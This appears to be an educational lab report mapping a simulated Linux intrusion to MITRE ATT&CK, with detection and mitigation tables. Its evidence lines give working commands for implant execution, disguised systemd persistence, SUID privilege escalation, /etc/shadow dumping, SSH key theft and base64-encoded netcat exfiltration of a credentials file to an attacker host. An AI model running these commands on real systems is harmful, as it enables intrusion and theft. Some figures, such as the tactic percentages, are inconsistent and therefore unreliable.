# MITRE ATT&CK Framework Mapping

## APT Simulation Complete Attack Chain

**Simulation Date:** March 26-27, 2026  
**Framework Version:** MITRE ATT&CK v15  
**Target Platform:** Linux (Ubuntu 22.04)

---

## 📊 Tactics & Techniques Overview

| Phase | Tactic | Technique ID | Technique Name | Sub-technique |
|-------|--------|--------------|----------------|---------------|
| 1 | Initial Access | T1566.001 | Phishing | Spearphishing Attachment |
| 1 | Execution | T1059.004 | Command and Scripting Interpreter | Unix Shell |
| 1 | Command & Control | T1071.001 | Application Layer Protocol | Web Protocols (mTLS) |
| 2 | Persistence | T1543.002 | Create or Modify System Process | Systemd Service |
| 2 | Defense Evasion | T1036.005 | Masquerading | Match Legitimate Name or Location |
| 2 | Privilege Escalation | T1548.001 | Abuse Elevation Control Mechanism | Setuid and Setgid |
| 2 | Credential Access | T1003.008 | OS Credential Dumping | /etc/passwd and /etc/shadow |
| 3 | Credential Access | T1552.004 | Unsecured Credentials | Private Keys |
| 3 | Lateral Movement | T1021.004 | Remote Services | SSH |
| 3 | Discovery | T1018 | Remote System Discovery | - |
| 3 | Collection | T1560.001 | Archive Collected Data | Archive via Utility |
| 4 | Collection | T1005 | Data from Local System | - |
| 4 | Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol | - |
| 4 | Defense Evasion | T1027 | Obfuscated Files or Information | - |

---

## 📋 Detailed Technique Breakdown

### Phase 1: Initial Access

#### 🔹 T1566.001 - Phishing: Spearphishing Attachment
- **Description:** Malicious implant delivered via SCP, simulating a scenario where an attacker obtained SSH credentials through phishing
- **Evidence:** `scp /tmp/UPSET_BIBLIOGRAPHY victim@192.168.59.12:/tmp/updater`
- **Platform:** Linux
- **Data Source:** Network intrusion detection system, Email gateway, Web proxy

#### 🔹 T1059.004 - Command and Scripting Interpreter: Unix Shell
- **Description:** ELF implant executed directly via bash shell on victim machine
- **Evidence:** `chmod +x /tmp/updater && /tmp/updater &`
- **Platform:** Linux, macOS
- **Data Source:** Process command-line parameters, Process monitoring

#### 🔹 T1071.001 - Application Layer Protocol: Web Protocols
- **Description:** Encrypted mTLS C2 channel over port 8888, mimicking HTTPS traffic patterns
- **Evidence:** mtls listener on port 8888; session established on 192.168.59.12:XXXXX
- **Protocol:** mTLS (Mutual TLS)
- **Data Source:** Network traffic: Netflow/Enclave netflow, Network protocol analysis, Packet capture

---

### Phase 2: Persistence & Privilege Escalation

#### 🔹 T1543.002 - Create or Modify System Process: Systemd Service
- **Description:** Malicious systemd service installed to launch implant on boot and restart automatically if crashed
- **Evidence:** 
  - `/etc/systemd/system/sysupdate.service` created
  - `systemctl enable sysupdate.service`
  - `systemctl start sysupdate.service`
- **Platform:** Linux
- **Data Source:** File monitoring, Process monitoring, Systemd logs

#### 🔹 T1036.005 - Masquerading: Match Legitimate Name or Location
- **Description:** Implant renamed to `.sysupdate` and moved to `/usr/local/bin/` with modified timestamp to blend with legitimate binaries
- **Evidence:**
  - `cp /tmp/updater /usr/local/bin/.sysupdate`
  - `touch -t 202201010000 /usr/local/bin/.sysupdate`
- **Platform:** Linux, macOS, Windows
- **Data Source:** File monitoring, Process monitoring

#### 🔹 T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
- **Description:** SUID bit on `/usr/bin/find` exploited using GTFOBins technique to spawn privileged shell
- **Evidence:** `find . -exec /bin/sh -p \; -quit` → root shell obtained
- **Platform:** Linux
- **Data Source:** Process command-line parameters, File monitoring
- **GTFOBins Reference:** [find](https://gtfobins.github.io/gtfobins/find/)

#### 🔹 T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow
- **Description:** After escalating to root, attacker read `/etc/shadow` containing password hashes
- **Evidence:** `cat /etc/shadow | head -5` (executed as root)
- **Platform:** Linux
- **Data Source:** File monitoring, Process monitoring

---

### Phase 3: Lateral Movement

#### 🔹 T1552.004 - Unsecured Credentials: Private Keys
- **Description:** SSH private key stolen from `/home/victim/.ssh/id_rsa` on Ubuntu 1
- **Evidence:** `download /home/victim/.ssh/id_rsa /home/kali/stolen_key.pem`
- **Platform:** Linux, macOS, Windows
- **Data Source:** File monitoring, Process monitoring

#### 🔹 T1021.004 - Remote Services: SSH
- **Description:** Stolen SSH private key used to authenticate to Ubuntu 2 without password
- **Evidence:** `ssh -i /home/kali/stolen_key.pem victim@192.168.59.13`
- **Platform:** Linux, macOS
- **Data Source:** Authentication logs, Network traffic, Process monitoring

#### 🔹 T1018 - Remote System Discovery
- **Description:** Internal network reconnaissance performed from compromised Ubuntu 2
- **Evidence:** 
  - `for ip in 192.168.59.{1..20}; do ping -c1 -W1 $ip &>/dev/null && echo "$ip is up"; done`
  - `ss -tulnp`
- **Platform:** Linux, macOS, Windows
- **Data Source:** Process command-line parameters, Network traffic

#### 🔹 T1560.001 - Archive Collected Data: Archive via Utility
- **Description:** SSH key exfiltrated via Sliver native download (implicit archiving of sensitive data)
- **Evidence:** Sliver console: `download /home/victim/.ssh/id_rsa`
- **Platform:** Linux, macOS, Windows
- **Data Source:** Process monitoring, File monitoring

---

### Phase 4: Data Exfiltration

#### 🔹 T1005 - Data from Local System
- **Description:** Sensitive file (`confidential.txt`) containing credentials and API keys collected from victim's home directory
- **Evidence:** `cat /home/victim/confidential.txt` via Sliver shell
- **Platform:** Linux, macOS, Windows
- **Data Source:** File monitoring, Process monitoring

#### 🔹 T1048.003 - Exfiltration Over Alternative Protocol
- **Description:** Data exfiltrated over raw TCP using netcat (non-standard protocol)
- **Evidence:**
  - Attacker: `nc -lvnp 9999`
  - Victim: `cat confidential.txt | base64 | nc 192.168.59.11 9999`
- **Port:** 9999/TCP
- **Data Source:** Network traffic, Packet capture

#### 🔹 T1027 - Obfuscated Files or Information
- **Description:** File encoded in base64 before transmission to evade string-based detection
- **Evidence:** `cat confidential.txt | base64 | nc 192.168.59.11 9999`
- **Platform:** Linux, macOS, Windows
- **Data Source:** Process monitoring, Network traffic

---

## 🔄 Attack Flow Diagram (MITRE View)
Initial Access (T1566.001)
↓
Execution (T1059.004)
↓
Command & Control (T1071.001)
↓
┌───────────────────────────────────────────────┐
│ Phase 2 │
│ ├── Persistence (T1543.002) │
│ ├── Defense Evasion (T1036.005) │
│ ├── Privilege Escalation (T1548.001) │
│ └── Credential Access (T1003.008) │
└───────────────────────────────────────────────┘
↓
┌───────────────────────────────────────────────┐
│ Phase 3 │
│ ├── Credential Access (T1552.004) │
│ ├── Lateral Movement (T1021.004) │
│ ├── Discovery (T1018) │
│ └── Collection (T1560.001) │
└───────────────────────────────────────────────┘
↓
┌───────────────────────────────────────────────┐
│ Phase 4 │
│ ├── Collection (T1005) │
│ ├── Exfiltration (T1048.003) │
│ └── Defense Evasion (T1027) │
└───────────────────────────────────────────────┘


---

## 🎯 Detection & Mitigation Recommendations

| Technique | Detection Methods | Mitigation Strategies |
|-----------|------------------|----------------------|
| **T1566.001 (Phishing)** | Email gateway analysis, User behavior analytics | MFA, Security awareness training, Email filtering |
| **T1071.001 (Web Protocols)** | TLS inspection, Anomaly detection on non-standard ports | Egress filtering, Allowlist required domains/IPs |
| **T1543.002 (Systemd Service)** | File integrity monitoring (AIDE, Tripwire), Auditd rules on `/etc/systemd/system/` | Principle of least privilege, Configuration management (Ansible, Puppet) |
| **T1548.001 (SUID Abuse)** | Monitor executions of SUID binaries with suspicious arguments | Restrict SUID binaries to minimal set, Use `sudo` with logging |
| **T1552.004 (Private Keys)** | File access auditing on `.ssh/` directories, Process monitoring for key access | SSH certificates with short TTLs, Hardware security modules, Agent forwarding restrictions |
| **T1021.004 (SSH)** | Authentication log analysis (failed/successful logins), Source IP correlation | Jump hosts, Network segmentation, SSH allowlists |
| **T1048.003 (Alternative Protocol)** | Netflow analysis for unexpected protocols, DLP solutions | Application allowlisting, Egress filtering, TLS inspection |

---

## 📊 Tactic Frequency Analysis

| Tactic | Techniques Used | Percentage |
|--------|----------------|------------|
| Defense Evasion | 2 (T1036.005, T1027) | 15% |
| Credential Access | 2 (T1003.008, T1552.004) | 15% |
| Collection | 2 (T1560.001, T1005) | 15% |
| Initial Access | 1 (T1566.001) | 8% |
| Execution | 1 (T1059.004) | 8% |
| C2 | 1 (T1071.001) | 8% |
| Persistence | 1 (T1543.002) | 8% |
| Privilege Escalation | 1 (T1548.001) | 8% |
| Lateral Movement | 1 (T1021.004) | 8% |
| Discovery | 1 (T1018) | 8% |
| Exfiltration | 1 (T1048.003) | 8% |

---

## 📚 References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [GTFOBins - SUID Binaries](https://gtfobins.github.io/)
- [Sliver C2 Documentation](https://sliver.sh/docs)
- [Linux Persistence Techniques](https://attack.mitre.org/techniques/T1543/002/)

---

## ⚠️ Disclaimer

This MITRE ATT&CK mapping is based on a controlled lab simulation conducted in an isolated environment. Real-world adversary behavior may vary. All techniques were executed with explicit authorization for educational purposes only.

---

**Last Updated:** March 27, 2026  
**MITRE ATT&CK Version:** v15  
**Classification:** Educational / Lab Use Only